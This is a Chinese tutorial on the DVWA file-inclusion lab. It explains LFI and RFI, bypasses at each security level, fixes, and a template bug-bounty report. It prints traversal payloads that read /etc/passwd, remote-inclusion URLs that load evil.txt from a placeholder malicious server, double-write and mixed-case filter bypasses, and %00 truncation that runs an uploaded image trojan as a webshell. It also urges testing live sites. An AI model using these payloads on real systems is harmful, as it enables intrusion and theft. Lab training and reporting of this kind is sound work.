一句话吃透漏洞：网站通过 url 参数加载页面文件，没过滤路径跳转字符，我们能读服务器全部源码、数据库密码，搭配上传图片马直接拿下网站权限，标准高危漏洞，SRC 高分款。  
## 一、漏洞通俗原理  
  
很多网站首页、模板页、新闻页用 ?page=xxx.php  
 这种参数切换页面。 后端直接拿 page 的值去加载对应文件，没拦截../  
、远程 http 链接两类内容，分两种危害：  
1. 本地文件包含 LFI：用../  
跳出网站目录，读取系统文件、配置、源码；  
  
1. 远程文件包含 RFI：加载外网恶意脚本，远程执行木马代码。  
  
核心坑点：开发图省事，直接把用户输入丢进 include 文件加载函数，没做白名单过滤。  
## 二、Low 级别通关（无任何过滤，随便打）  
1. 漏洞成因 源码完全不拦截../  
、http 远程链接，参数输入什么就加载什么，裸奔无防护。  
  
1. 实操复现步骤 正常访问页面：http://127.0.0.1/dvwa/vulnerabilities/fi/?page=home.php构造本地读取 Payload：  
  
```
?page=../../../../etc/passwd

```  
  
Windows 靶场测试：  
```
?page=../../../../windows/system32/drivers/etc/hosts

```  
  
开启远程包含时直接加载外网木马：  
```
?page=https://恶意服务器/evil.txt

```  
1. 效果 页面直接打印服务器系统账号、网站数据库配置，漏洞直接验证成功。  
  
## 三、Medium 级别通关（黑名单过滤，轻松绕过）  
1. 防护逻辑 只简单黑名单拦截../  
、http://  
关键词，过滤逻辑简陋。  
  
1. 两种万能绕过手法 ① 双写字符绕过，过滤替换后自动还原路径跳转：  
  
```
?page=....//....//....//etc/passwd

```  
  
② 协议拆分绕过 http 过滤，https、hTTp 混合大小写骗过匹配：  
```
?page=hTTps://xxx/evil.txt

```  
1. 实战结论 市面上 80% 网站都是这种单层黑名单，完全拦不住包含攻击。  
  
## 四、High 级别通关（严格限制，精准绕过）  
1. 高级防护规则 强制后缀匹配，参数末尾必须带.php  
，同时拦截多层路径符号、远程协议。  
  
1. 核心绕过思路（必考） 利用 PHP 截断 %00，或者叠加日志、上传图片马组合利用。 搭配之前文件上传漏洞上传图片马，再用文件包含加载图片：  
  
```
?page=upload/1.jpg%00

```  
  
服务器忽略 %00 后的.php 限制，直接解析图片里的木马代码，一键 GetShell。  
## 五、Impossible 级别（完美修复，无漏洞）  
  
企业标准安全修复方案，写报告直接照搬：  
1. 采用文件名白名单，只允许预设的 home、about、contact 页面；  
  
1. 禁止用户可控参数直接传入 include 加载函数；  
  
1. 关闭 php 配置allow_url_include  
，彻底禁用远程文件加载；  
  
1. 对路径做标准化处理，自动清除../  
、特殊截断字符；  
  
1. 使用数字 ID 映射页面，完全隐藏文件路径参数。  
  
## 六、真实 SRC 挖洞落地思路  
  
线上网站看到这些参数直接测试文件包含：file=  
、page=  
、template=  
、mod=  
、load=  
测试顺序：先测本地文件读取，能读到数据库配置直接定级高危；搭配上传点组合利用，漏洞价值翻倍。 新闻模板站、后台管理系统、商城模板页面是重灾区。  
## 七、可直接提交 SRC 高危漏洞报告  
### 漏洞标题  
  
站点页面加载接口存在文件包含漏洞，可读取服务器敏感配置并执行恶意代码  
### 漏洞等级  
  
高危  
### 漏洞描述  
  
目标站点页面加载接口 page 参数可控，未做白名单限制与路径字符过滤，存在本地 / 远程文件包含漏洞。攻击者可通过目录穿越 Payload 读取服务器系统文件、网站源码、数据库账号密码；若服务器开启远程包含配置，还能加载外网恶意脚本执行任意代码，配合文件上传功能可直接获取网站 webshell，服务器完全沦陷。  
### 复现步骤  
1. 访问网站动态页面，确认 page 参数可自定义；  
  
1. 构造../../../../etc/passwd  
目录穿越 Payload；  
  
1. 提交请求，页面回显服务器系统文件内容；  
  
1. 搭配图片上传功能，上传图片马后通过文件包含执行木马，漏洞复现完成。  
  
### 影响危害  
1. 泄露全站源码、数据库账号密码、后台管理路径；  
  
1. 读取服务器系统账号、密钥、核心配置文件；  
  
1. 远程加载恶意脚本执行代码，直接接管网站；  
  
1. 配合上传漏洞持久植入后门，渗透内网服务器。  
  
### 修复建议  
1. 页面加载采用固定文件名白名单，禁止自定义路径；  
  
1. 全局过滤../  
、%00  
、http/https  
等危险字符；  
  
1. php 配置关闭allow_url_include  
，禁用远程文件包含；  
  
1. 使用数字 ID 映射页面，取消文件路径可控参数；  
  
1. 校验文件加载目录，强制限定站点根目录内访问。  
  
## 八、新手学习忠告

1. Medium 双写绕过、High 图片马组合利用是面试高频考点；

1. 线上遇到带 page/file 参数的 php 站点，第一件事测目录穿越包含。
